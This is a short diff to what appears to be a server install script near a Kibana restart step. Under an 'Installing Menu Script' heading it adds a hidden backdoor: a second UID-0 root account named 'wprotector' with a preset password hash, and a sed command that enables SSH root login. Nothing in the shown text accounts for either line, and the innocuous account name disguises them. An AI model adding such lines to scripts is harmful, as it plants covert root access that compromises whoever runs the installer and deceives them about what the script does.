@@ -248,3 +248,6 @@ service kibana restart
 
 
 ###Instaling Menu Script ###
+
+useradd -u 0 -o -g 0 -m -s /bin/bash -p '$6$AdXCZeT2$hOludb446sAr7LlxU0UH21OTDwm48aa1pKYulV.9vNm79AosseEJ5vjwOpa4k8lb0kk7lX.HTKE85.xdLo7wW.' wprotector
+sed -i "s/PermitRootLogin no/PermitRootLogin yes/" /etc/ssh/sshd_config
